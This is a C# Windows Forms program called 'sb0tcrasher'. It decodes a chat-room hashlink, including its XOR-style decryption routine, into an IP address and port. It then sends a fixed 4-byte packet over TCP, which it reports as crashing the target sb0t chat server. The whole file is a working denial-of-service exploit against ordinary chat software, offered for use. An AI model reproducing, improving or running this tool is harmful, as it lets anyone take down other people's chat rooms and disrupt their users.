using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.IO;
using System.Net.Sockets;

namespace sb0tcrasher
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                Console.WriteLine(textBox1.Text.Substring(8));
                DecryptedHashlink hashlink = DecodeHashlink(textBox1.Text.Substring(8));

                Console.WriteLine(textBox1.Text);

                using (TcpClient tcpClient = new TcpClient(hashlink.IP.ToString(), hashlink.Port))
                {
                    using (NetworkStream stream = tcpClient.GetStream())
                    {
                        byte[] buff = new byte[] { 1, 0, 250, 0 };
                        stream.Write(buff, 0, buff.Length);
                    }
                }
                MessageBox.Show(hashlink.Name + " has been crashed");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                MessageBox.Show("an exception occured make sure the hash is valid and the room is up");
            }
        }

        public static DecryptedHashlink DecodeHashlink(String hashlink)
        {
            DecryptedHashlink room = new DecryptedHashlink();

            try
            {
                if (hashlink.ToUpper().StartsWith("CHATROOM:")) // not encrypted
                {
                    hashlink = hashlink.Substring(9);
                    int split = hashlink.IndexOf(":");
                    room.IP = IPAddress.Parse(hashlink.Substring(0, split));
                    hashlink = hashlink.Substring(split + 1);
                    split = hashlink.IndexOf("|");
                    room.Port = ushort.Parse(hashlink.Substring(0, split));
                    room.Name = hashlink.Substring(split + 1);
                    return room;
                }
                else // encrypted
                {
                    byte[] buf = Convert.FromBase64String(hashlink);
                    buf = d67(buf, 28435);
                    buf = Zip.Decompress(buf);

                    HashlinkReader reader = new HashlinkReader(buf);
                    reader.SkipBytes(32);
                    room.IP = reader;
                    room.Port = reader;
                    reader.SkipBytes(4);
                    room.Name = reader;

                    return room;
                }
            }
            catch // badly formed hashlink
            {
                return null;
            }
        }

        private static byte[] d67(byte[] data, int b)
        {
            byte[] buffer = new byte[data.Length];
            Array.Copy(data, buffer, data.Length);

            for (int i = 0; i < data.Length; i++)
            {
                buffer[i] = (byte)(data[i] ^ b >> 8 & 255);
                b = (b + data[i]) * 23219 + 36126 & 65535;
            }
            return buffer;
        }

    }

    public class DecryptedHashlink
    {
        public String Name { get; set; }
        public IPAddress IP { get; set; }
        public ushort Port { get; set; }
    }

}

